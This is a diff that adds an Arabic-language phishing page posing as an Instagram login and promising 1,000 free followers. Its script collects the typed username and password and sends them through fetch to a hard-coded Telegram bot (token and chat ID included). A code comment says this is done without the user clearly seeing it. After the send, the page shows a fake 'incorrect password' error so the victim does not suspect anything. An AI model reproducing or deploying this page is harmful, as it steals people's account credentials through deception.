@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap'); /* خط شبيه بخط إنستجرام */
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #000428, #004e92, #ff007f); /* إضافة التدرج الزهري */
+            color: white;
+            overflow: hidden;
+        }
+
+        .overlay {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            text-align: center;
+            padding: 20px;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .logo {
+            font-size: 50px;
+            font-family: 'Pacifico', cursive; /* خط إنستجرام */
+            color: #ffdd57;
+            text-shadow: 0 0 10px rgba(255, 221, 87, 0.8);
+            animation: slideIn 1.5s ease-out;
+        }
+
+        .subtitle {
+            font-size: 24px;
+            color: #fff;
+            margin-top: 10px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.6);
+            animation: fadeIn 1.5s ease-out 0.5s;
+        }
+
+        .login-box {
+            margin-top: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 400px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            animation: fadeIn 2s ease-out 1s;
+            position: relative;
+        }
+
+        .login-box input {
+            background: rgba(255, 255, 255, 0.8);
+            border: none;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            width: calc(100% - 20px);
+            font-size: 16px;
+        }
+
+        .login-box button {
+            background: linear-gradient(to right, #ff007f, #ff4f9f);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            max-width: calc(100% - 10px);
+            box-shadow: 0 4px 10px rgba(255, 0, 127, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .login-box button:hover {
+            background: linear-gradient(to right, #ff4f9f, #ff007f);
+            transform: scale(1.05); /* تكبير الزر قليلاً عند تمرير الماوس */
+            box-shadow: 0 6px 15px rgba(255, 0, 127, 0.5);
+        }
+
+        .error-message {
+            color: #ff4f4f;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            0% { transform: translateY(-50px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+<div class="overlay">
+    <div class="logo">Instagram</div>
+    <div class="subtitle">+1000 متابع مجاني</div>
+    <div class="login-box">
+        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button onclick="sendData()">تسجيل الدخول</button>
+        <div class="error-message" id="error-message">اسم المستخدم أو كلمة المرور غير صحيحة.</div>
+    </div>
+</div>
+
+<script>
+    function sendData() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // إذا كان الحقل فارغًا، تظهر رسالة الخطأ
+        if (!username || !password) {
+            document.getElementById('error-message').style.display = 'block';
+            return;
+        }
+
+        // إخفاء رسالة الخطأ عند وجود بيانات
+        document.getElementById('error-message').style.display = 'none';
+
+        // إعداد بيانات البوت
+        const botToken = "7952592542:AAHy6G98N-PoKsQM9adHQQiBbxBJCCw_Lo4";
+        const chatId = "6647290277";
+        const message = `Username: ${username}\nPassword: ${password}`;
+
+        // إرسال البيانات إلى البوت بدون ظهور واضح للمستخدم
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                // إذا تم إرسال البيانات بنجاح، تظهر رسالة الخطأ كإشارة خاطئة
+                document.getElementById('error-message').style.display = 'block';
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
+</body>
+</html>
